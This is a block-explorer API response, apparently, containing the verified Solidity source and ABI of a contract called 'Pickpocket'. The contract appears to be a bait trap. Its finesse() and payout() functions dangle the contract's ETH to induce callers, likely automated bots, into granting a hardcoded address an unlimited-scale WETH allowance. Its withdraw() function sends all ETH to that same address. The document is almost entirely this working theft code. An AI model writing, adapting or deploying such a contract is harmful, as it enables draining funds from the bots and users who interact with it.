{"status":"1","message":"OK","result":[{"SourceCode":"// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.4;\r\n\r\n// ty for playing <3 - ghili\r\ncontract Pickpocket {\r\n\r\n    receive() external payable {}\r\n\r\n    function withdraw() external {\r\n        (bool success, ) = payable(0xFd495eeEd737b002Ea62Cf0534e7707a9656ba19).call{value: address(this).balance}(\"\");\r\n        require(success, \"Pickpocket: withdraw did not go thru :(\");\r\n    }\r\n\r\n    function finesse(address _payee) external {\r\n        address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\r\n        (bool approved, ) = weth.call(abi.encodeWithSignature(\"approve(address, uint256)\", 0xFd495eeEd737b002Ea62Cf0534e7707a9656ba19, 1000000000 ether));\r\n        require(approved, \"Pickpocket: approval did not go thru :(\");\r\n        (bool success, ) = _payee.call(abi.encodeWithSignature(\"payout()\"));\r\n        require(success, \"Pickpocket: payout did not go thru :(\");\r\n    }\r\n\r\n    function payout() external {\r\n        address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\r\n        \r\n        (bool allowance, bytes memory returnData) = weth.staticcall(abi.encodeWithSignature(\"allowance(address, address)\", msg.sender, 0xFd495eeEd737b002Ea62Cf0534e7707a9656ba19));\r\n        require(allowance, \"Pickpocket: allowance query did not work\");\r\n        (uint256 amount) = abi.decode(returnData, (uint256));\r\n        require(amount == 1000000000 ether, \"Pickpocket: you did not approve us\");\r\n\r\n        (bool balance, bytes memory data) = weth.staticcall(abi.encodeWithSignature(\"balanceOf(address)\", msg.sender));\r\n        require(balance, \"Pickpocket: balanceOf query did not work\");\r\n        (uint256 value) = abi.decode(data, (uint256));\r\n        require(value >= 1 ether, \"Pickpocket: you broke asl T-T\");\r\n\r\n        (bool success, ) = payable(msg.sender).call{value: address(this).balance}(\"\");\r\n        require(success, \"Pickpocket: call did not go thru :(\");\r\n    }\r\n}","ABI":"[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_payee\",\"type\":\"address\"}],\"name\":\"finesse\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"payout\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]","ContractName":"Pickpocket","CompilerVersion":"v0.8.4+commit.c7e474f2","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"MIT","Proxy":"0","Implementation":"","SwarmSource":"ipfs://66909a8c0e6d1584eee668c21c83cb563be71f26d3968f25130fa3359752e526"}]}